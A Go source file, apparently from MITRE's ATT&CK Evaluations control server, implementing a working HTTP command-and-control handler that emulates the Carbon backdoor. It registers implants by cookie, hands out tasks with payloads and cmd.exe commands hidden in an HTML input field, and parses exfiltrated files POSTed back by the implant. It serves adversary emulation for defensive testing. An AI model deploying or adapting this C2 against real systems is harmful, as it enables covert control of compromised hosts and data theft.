// HTTP-based Carbon C2 handler

package carbon

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/logger"
)

const (
	serverErrMsg = "Internal server error"
)

// For wrapping functions to generate random bytes
type genRandBytesWrapper func([]byte) (int, error)

// Represents the HTTP-based Carbon C2 handler. Will implement the util.Handler interface.
type CarbonHttpHandler struct {
	restAPIaddress       string
	server               *http.Server
	listenAddress        string
	heartbeatResponse    string
	commandNumbers       map[string]int // maps known implant UUIDs to the next command number available (starting with 1)
	commandResponseName  string // used to communicate the command name for the implant
	commandReponseb64    string // used to communicate the task for the implant
	pendingCommandOutput map[string]map[int]bool // maps implant UUIDs to a map linking command numbers to boolean indicating if we're waiting on output
	pendingUploads       map[string]map[int]string // maps implant UUIDs to a map linking command numbers to string indicating upload file name.
	rsaPublicKey         *rsa.PublicKey
	useEncryption        bool
	genRandBytesFn       genRandBytesWrapper
}

// Represents a task obtained from the restAPI
type Task struct {
	taskID             int32
	lenRoutingBlob     int32
	routingBlob        []byte
	taskCode           int32
	lenPayload         int32
	payloadData        []byte
	lenConfig          int32
	configData         []byte
}

// Represents the POST response that implants are expected to send to the handler
type ImplantResponse struct {
	responseID          int
	filesSent           int
	firstFileSize       int
	firstFileContent    []byte
	secondFileSize      int
	secondFileContent   []byte
	uuidLength          int
	uuid                string
}

// Wrapper for crypto/rand Read method
func generateRandomBytes(b []byte) (int, error) {
	return rand.Read(b)
}

// Factory method for creating a Carbon C2 handler
func carbonHttpHandlerFactory(useEncryption bool, genRandBytesFn genRandBytesWrapper) *CarbonHttpHandler {
	// Import RSA key
	pubKey, err := importRsaPubKey()
        if err != nil {
                panic("Failed to import RSA public key: " + err.Error())
        }

	// restAPIaddress, server, and listenAddress will be initialized when handler is started
	return &CarbonHttpHandler{
		commandNumbers: make(map[string]int),
		pendingCommandOutput: make(map[string]map[int]bool),
		pendingUploads: make(map[string]map[int]string),
		rsaPublicKey: pubKey,
		useEncryption: useEncryption,
		genRandBytesFn: genRandBytesFn,
	}
}

// Creates and adds the Carbon C2 handler to the map of available C2 handlers.
func init() {
	util.AvailableHandlers["carbonhttp"] = carbonHttpHandlerFactory(true, generateRandomBytes)
}

// StartHandler starts the Carbon C2 handler server
func (c *CarbonHttpHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
	listenAddress, err := config.GetHostPortString(configEntry)
	if err != nil {
		return err
	}
	c.listenAddress = listenAddress
	logger.Info("Starting Carbon HTTP Handler")

	// make sure we know the REST API address
	c.restAPIaddress = restAddress

	// initialize URL router
	urlRouter := mux.NewRouter()

	c.server = &http.Server{
		Addr:         c.listenAddress,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      urlRouter,
	}

	// set the response fields, should be able to change dynamically in future PR
	c.commandResponseName = "nameField"
	c.commandReponseb64 = "data_in_b64"

	// bind HTTP routes to their functions
	urlRouter.HandleFunc("/", c.handleHeartbeat).Methods("GET")
	urlRouter.HandleFunc("/javascript/{reqPage}", c.handleBeacon).Methods("GET")
	urlRouter.HandleFunc("/javascript/", c.handleResponse).Methods("POST")
	urlRouter.HandleFunc("/javascript/{reqPage}", c.handleResponse).Methods("POST")

	// start handler in goroutine so it doesn't block
	go func() {
		err := c.server.ListenAndServe()
		if err != nil && err.Error() != "http: Server closed" {
			logger.Error(err)
		}
	}()
	return nil
}

// StopHandler stops the Carbon server
func (c *CarbonHttpHandler) StopHandler() error {
	logger.Info("Killing Carbon HTTP server")
	emptyContext := context.Background()
	return c.server.Shutdown(emptyContext)
}

func (c *CarbonHttpHandler) handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	logger.Info("Received heartbeat request")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("200 OK"))
	return
}

func (c *CarbonHttpHandler) hasImplantSession(uuid string) bool {
	_, ok := c.commandNumbers[uuid]
	return ok
}

func (c *CarbonHttpHandler) storeImplantSession(uuid string) error {
	if c.hasImplantSession(uuid) {
		return errors.New(fmt.Sprintf("Session %s already exists.", uuid))
	}
	c.commandNumbers[uuid] = 1
	c.pendingCommandOutput[uuid] = make(map[int]bool)
	c.pendingUploads[uuid] = make(map[int]string)
	return nil
}

func createNewSessionDataBytes(uuid string) []byte {
	jsonStr, err := json.Marshal(map[string]string{"guid": uuid})
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to create JSON info for session for UUID %s: %s", uuid, err.Error()))
		return nil
	}
	return []byte(jsonStr)
}

func forwardRegisterImplant(restAPIaddress string, implantData []byte) (string, error) {
	url := "http://" + restAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	return util.ExtractRestApiStringResponsedData(response)
}

func (c *CarbonHttpHandler) registerNewImplant(uuid string) error {
	implantData := createNewSessionDataBytes(uuid)
	restResponse, err := forwardRegisterImplant(c.restAPIaddress, implantData)
	if err != nil {
		return err
	}
	if err = c.storeImplantSession(uuid); err != nil {
		return err
	}
	logger.Info(restResponse)
	logger.Success(fmt.Sprintf("Successfully created session for implant %s.", uuid))
	return nil
}

// Query the REST API for tasks for the implant with the specified UUID.
// return the task as a string and any errors received
func forwardGetTask(restAPIaddress string, uuid string) (string, error) {
	url := "http://" + restAPIaddress + "/api/v1.0/session/" + uuid + "/task"
	response, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	sessionData, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

// Receiving file from the control server. If the file does not exist, an error response is returned.
func (c *CarbonHttpHandler) forwardGetFileFromServer(fileName string) ([]byte, error) {
	url := "http://" + c.restAPIaddress + "/api/v1.0/files/carbon/" + fileName
	resp, err := http.Get(url)
	var filedata []byte
	if err != nil {
		return filedata, err
	}
	if resp.StatusCode != 200 {
		return filedata, errors.New("server did not return requested file: " + fileName)
	}
	filedata, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return filedata, err
	}
	return filedata, nil
}

func buildConfigData(payloadPath, command string) []byte {
	/* 
	 [CONFIG]
	 name = C:\users\public\sysh32.bat
	 exe = cmd.exe /c C:\users\public\sysh32.bat
	*/
	if len(payloadPath) > 0 {
		return []byte("[CONFIG]\nname = " + payloadPath + "\nexe = " + command + "\n")
	} else {
		return []byte("[CONFIG]\nexe = " + command + "\n")
	}
}

// take a task string and fill out a Task struct using that information
// if there are any errors in converting strings to int, return them
func (c *CarbonHttpHandler) extractTaskParts(taskString string, task *Task) (error) {
	trimmedTask := strings.TrimSpace(taskString)
	var instructionData map[string]interface{}
	err := json.Unmarshal([]byte(trimmedTask), &instructionData)
	if err != nil {
		return err
	}
	
	// Extract task ID (required)
	if taskIdVal, ok := instructionData["id"]; ok {
		parsedTaskId, castOk := taskIdVal.(float64)
		if !castOk {
			return errors.New(fmt.Sprintf("Bad task ID: %v", taskIdVal))
		}
		task.taskID = int32(parsedTaskId)
	} else {
		return errors.New("Task ID not provided in task string")
	}
	
	// Extract routing blob (default empty)
	if routingBlobStr, ok := instructionData["routing"]; ok {
		task.routingBlob = []byte(strings.TrimSpace(routingBlobStr.(string)))
	} else {
		task.routingBlob = make([]byte, 0)
	}
	task.lenRoutingBlob = int32(len(task.routingBlob))
	
	// Extract task code (default 0)
	if taskCodeVal, ok := instructionData["code"]; ok {
		parsedTaskCode, castOk := taskCodeVal.(float64)
		if !castOk {
			return errors.New(fmt.Sprintf("Bad task code: %v", taskCodeVal))
		}
		task.taskCode = int32(parsedTaskCode)
	} else {
		task.taskCode = int32(0)
	}
	
	// Extract payload info
	payloadNameStr, ok := instructionData["payload"]
	if !ok {
		payloadNameStr = ""
	}
	payloadName := strings.TrimSpace(payloadNameStr.(string))
	payloadDestPath := ""
	if len(payloadName) > 0 {
		logger.Info("Fetching requested payload for task: ", payloadName)
		task.payloadData, err = c.forwardGetFileFromServer(payloadName)
		if err != nil {
			return err
		}
		payloadDestPathStr, ok := instructionData["payload_dest"]
		if !ok {
			return errors.New("Payload destination path not provided with payload name.")
		}
		payloadDestPath = strings.TrimSpace(payloadDestPathStr.(string))
		if len(payloadDestPath) == 0 {
			return errors.New("Empty pyload destination path provided")
		}
	} else {
		task.payloadData = []byte{}
	}
	task.lenPayload = int32(len(task.payloadData))
	
	// Extract command info
	command := ""
	if commandStr, ok := instructionData["cmd"]; ok {
		command = strings.TrimSpace(commandStr.(string))
	}
	
	// Build task config
	task.configData = buildConfigData(payloadDestPath, command)
	task.lenConfig = int32(len(task.configData))

	return nil	
}

/* Chunks layout:
byte offset | field
0           | task ID (int)
4           | routing blob length f (int)
8           | routing blob (bytes to be interpreted as string)
f + 8       | task code (int)
f + 12      | length l of task payload (int)
f + 16      | payload blob (bytes)
f + l + 16  | length c of config data
f + l + 20  | config data (bytes to be interpreted as string)
*/
func buildCompleteTaskBytes(task *Task) ([]byte, error) {
	buf := new(bytes.Buffer)
	err := binary.Write(buf, binary.LittleEndian, task.taskID)
	if err != nil {
		return nil, err
	}
	if err = binary.Write(buf, binary.LittleEndian, task.lenRoutingBlob); err != nil {
		return nil, err
	}
	if _, err = buf.Write(task.routingBlob); err != nil {
		return nil, err
	}
	if err = binary.Write(buf, binary.LittleEndian, task.taskCode); err != nil {
		return nil, err
	}
	if err = binary.Write(buf, binary.LittleEndian, task.lenPayload); err != nil {
		return nil, err
	}
	if _, err = buf.Write(task.payloadData); err != nil {
		return nil, err
	}
	if err = binary.Write(buf, binary.LittleEndian, task.lenConfig); err != nil {
		return nil, err
	}
	if _, err = buf.Write(task.configData); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// given a uuid and a task for that uuid, fill out a Task struct, encode the task to b64
// and generate a response page with the task in it. if the task is blank, a response
// page will be generated with "" as its value instead of the b64 encoded task
func (c *CarbonHttpHandler) convertTaskToResponse(uuid, taskString string) (string, error) {
	if !c.hasImplantSession(uuid) {
		return "", errors.New(fmt.Sprintf("No existing session for implant %s.", uuid))
	}
	if _, ok := c.pendingCommandOutput[uuid]; !ok {
		c.pendingCommandOutput[uuid] = make(map[int]bool)
	}

	var task Task
	var err error
	commandNum := -1
	encodedCommand := ""

	if len(taskString) > 0 {
		err = c.extractTaskParts(taskString, &task)
		if err != nil {
			return "", err
		}
		commandNum = c.commandNumbers[uuid]
		c.pendingCommandOutput[uuid][commandNum] = true
		completeTaskBytes, err := buildCompleteTaskBytes(&task)
		if err != nil {
			return "", err
		}
		encodedCommand, err = c.encodeTaskResponse(completeTaskBytes)
		if err != nil {
			return "", err
		}
		if (len(encodedCommand) > 600) {
			logger.Info(fmt.Sprintf("Encoded task string (truncated): %s ... %s", encodedCommand[0:250], encodedCommand[len(encodedCommand) - 250:]))
		} else {
			logger.Info(fmt.Sprintf("Encoded task string: %s", encodedCommand))
		}
		
		c.commandNumbers[uuid] = commandNum + 1
	}
	response := c.buildResponsePage(encodedCommand)
	if encodedCommand == "" {
		logger.Info(fmt.Sprintf("Command is blank, returning task of \"\""))
	} else {
		logger.Info(fmt.Sprintf("Assigning task #%d to implant %s", commandNum, uuid))
		logger.Debug(fmt.Sprintf("Task #%d data:\n\tTask-ID: %d\n\tlenRoutingBlob: %d\n\troutingBlob: %v\n\tTask Code: %d\n\tlenPayload: %d\n\tlenConfig: %d\n\tConfig: %s",
			commandNum, task.taskID, task.lenRoutingBlob, task.routingBlob, task.taskCode, task.lenPayload, task.lenConfig, string(task.configData)))
	}
	if (len(response) > 120) {
		logger.Debug(fmt.Sprintf("Response HTML (truncated): %s ... %s", response[0:50], response[len(response) - 50:]))
	} else {
		logger.Debug(fmt.Sprintf("Response HTML: %s", response))
	}
	return response, nil
}

// function to construct the HTML response page for an implant's tasking
// for now, just a basic HTML page with the <input> tag that can contain a task
// <SOURCE>
func (c *CarbonHttpHandler) buildResponsePage(task string) string {
	pageHeader := "<!DOCTYPE html>\n"
	pageTag := "<input name=\"" + c.commandResponseName + "\" value=\"" + task + "\">"
	responsePage := pageHeader + pageTag
	return responsePage
}

// if the server receives a GET request to /javascript/*, where * is any page,
// attempt to register a new session if there is a PHPSESSID cookie
// or notify the implant that the session exists if it has been registered.
// note that /javascript/ is not a valid page.
// return tasking instructions at /javascript/view.php
func (c *CarbonHttpHandler) handleBeacon(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	task := ""

	reqPage, ok := vars["reqPage"]
	if !ok {
		logger.Error("reqPage not included in GET request to /javascript/{reqPage}")
		w.WriteHeader(http.StatusNotFound)
		return
	}

	// grab the uuid from the cookie here
	// <SOURCE>
	uuidCookie, err := r.Cookie("PHPSESSID")
	if err != nil {
		logger.Error(fmt.Sprintf("Error occured while reading uuid cookie: %s", err.Error()))
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	uuid := uuidCookie.Value

	// if the implant doesn't have a session, create one. if it does, log that an existing session beaconed
	// this will happen for any request to /javascript/*
	// if view.php was requested, respond with data from that as well as the session created/existing message
	if !c.hasImplantSession(uuid) {
		logger.Info(fmt.Sprintf("Received first-time beacon from %s. Creating session...", uuid))
		err = c.registerNewImplant(uuid)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to register implant session: %s", err.Error()))
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(serverErrMsg))
			return
		}
		logger.Info(fmt.Sprintf("Session created for implant %s", uuid))
	} else {
		logger.Info(fmt.Sprintf("Received beacon from existing implant %s.", uuid))
	}

	// Forward Beacon to CALDERA
	if config.IsCalderaForwardingEnabled() {
		apiResponse, err := util.ForwardImplantBeacon(uuid, c.restAPIaddress)
		if err != nil {
			logger.Error(fmt.Sprintf("Error occured while forwarding implant beacon to CALDERA for session %s: %s", uuid, err.Error()))
		} else {
			logger.Info(fmt.Sprintf("Successfully forwarded implant beacon for session %s to CALDERA: %s", uuid, apiResponse))
		}
	}

	// Carbon C2 replies to GET request to /javascript/view.php with some HTML (for now)
	// <SOURCE>
	// generate the the response page
	if reqPage == "view.php" {
		logger.Info(fmt.Sprintf("Received task request from implant '%s' at page '%s'", uuid, reqPage))
		task, err = forwardGetTask(c.restAPIaddress, uuid)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to fetch implant task: %s", err.Error()))
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(serverErrMsg))
			return
		}
		response, err := c.convertTaskToResponse(uuid, task)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to convert task to response: %s", err.Error()))
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(serverErrMsg))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(response))
		return
	}
	w.WriteHeader(http.StatusOK) // if a page we handle wasn't requested, just return 200 OK
	return
}

func checkArrayBounds(arrayLen int, end int) error {
	if end > arrayLen {
		return errors.New(fmt.Sprintf("Attempting to access array out of bounds"))
	}
	return nil
}

// take the data given and populate the ImplantResponse with it
func (c *CarbonHttpHandler) processReturnData(ciphertext []byte, impResponse *ImplantResponse) error {
	var err error

	data, err := c.decodePostResponse(ciphertext)
	if err != nil {
		return err
	}


	dataLen := len(data)
	counter := 0

	err = checkArrayBounds(dataLen, counter+4)
	if err != nil {
		return err
	}
	impResponse.responseID = int(binary.LittleEndian.Uint32(data[0:counter+4]))
	counter += 4

	err = checkArrayBounds(dataLen, counter+4)
	if err != nil {
		return err
	}
	impResponse.filesSent = int(binary.LittleEndian.Uint32(data[counter:counter+4]))
	if !(impResponse.filesSent == 1 || impResponse.filesSent == 2) {
		return errors.New(fmt.Sprintf("Invalid value '%d' for files sent, only 1 or 2 are supported.", impResponse.filesSent))
	}
	counter += 4

	err = checkArrayBounds(dataLen, counter+4)
	if err != nil {
		return err
	}
	impResponse.firstFileSize = int(binary.LittleEndian.Uint32(data[counter:counter+4]))
	counter += 4

	err = checkArrayBounds(dataLen, counter+impResponse.firstFileSize)
	if err != nil {
		return err
	}
	impResponse.firstFileContent = data[counter:counter+impResponse.firstFileSize]
	counter += impResponse.firstFileSize

	if impResponse.filesSent == 2 {
		err = checkArrayBounds(dataLen, counter+4)
		if err != nil {
			return err
		}
		impResponse.secondFileSize = int(binary.LittleEndian.Uint32(data[counter:counter+4]))
		counter += 4

		err = checkArrayBounds(dataLen, counter+impResponse.secondFileSize)
		if err != nil {
			return err
		}
		impResponse.secondFileContent = data[counter:counter+impResponse.secondFileSize]
		counter += impResponse.secondFileSize
	}

	err = checkArrayBounds(dataLen, counter+4)
	if err != nil {
		return err
	}
	impResponse.uuidLength = int(binary.LittleEndian.Uint32(data[counter:counter+4]))
	counter += 4

	err = checkArrayBounds(dataLen, counter+impResponse.uuidLength)
	if err != nil {
		return err
	}
	impResponse.uuid = string(data[counter:counter+impResponse.uuidLength])

	return nil
}

func (c *CarbonHttpHandler) processAndForwardImplantOutput(uuid string, data []byte) (error) {
	var impResponse ImplantResponse
	var err error

	_, pendingOutput := c.pendingCommandOutput[uuid]
	if !(pendingOutput) {
		return errors.New(fmt.Sprintf("Implant %s does not have any tasks pending output.", uuid))
	}

	// unpack the response data into an ImplantResponse
	err = c.processReturnData(data, &impResponse)
	if err != nil {
		return err
	}

	if strings.Contains(string(impResponse.firstFileContent), "Result file for TaskID:") {
		// ignore "Result file for TaskID: " string
		resultFileOutput := strings.SplitN(string(impResponse.firstFileContent), "\n", 2)
		output := []byte(resultFileOutput[1])

		//forward the task output the to rest API
		restResponse, err := util.ForwardTaskOutput(c.restAPIaddress, uuid, output)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
		}
		logger.Success(string(restResponse))
		delete(c.pendingCommandOutput[uuid], int(c.commandNumbers[uuid]))		
	}

	// for now, just output the unpacked data
	logger.Info(fmt.Sprintf("Processing response for implant %s with responseID %d", uuid, impResponse.responseID))
	logger.Debug(fmt.Sprintf("Response filesSent: %d", impResponse.filesSent))
	logger.Debug(fmt.Sprintf("Response firstFileSize: %d", impResponse.firstFileSize))
	logger.Debug(fmt.Sprintf("Response firstFileContent: %s", impResponse.firstFileContent))
	logger.Debug(fmt.Sprintf("Response secondFileSize: %d", impResponse.secondFileSize))
	logger.Debug(fmt.Sprintf("Response secondFileContent: %s", impResponse.secondFileContent))
	logger.Debug(fmt.Sprintf("Response uuidLength: %d", impResponse.uuidLength))
	logger.Debug(fmt.Sprintf("Response uuid: %s", impResponse.uuid))

	return nil
}

// if the server receives a POST request to /javascript/ it looks for the PHPSESSID cookie
// and processes the data posted in that request
func (c *CarbonHttpHandler) handleResponse(w http.ResponseWriter, r *http.Request) {
	// get the uuid from the PHPSESSID cookie
	uuidCookie, err := r.Cookie("PHPSESSID")
	if err != nil {
		logger.Error(fmt.Sprintf("Error occured while reading uuid cookie: %s", err.Error()))
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	uuid := uuidCookie.Value

	// get the body from the post request
	postBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to read POST body: %s", err.Error()))
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}

	err = c.processAndForwardImplantOutput(uuid, postBody)
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to process and forward task output: %s", err.Error()))
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(serverErrMsg))
		return
	}

	w.WriteHeader(http.StatusOK)
}

func (c *CarbonHttpHandler) getRsaPubKeyModulus() *big.Int {
	return c.rsaPublicKey.N
}

func (c *CarbonHttpHandler) getRsaPubKeyExponent() int {
	return c.rsaPublicKey.E
}
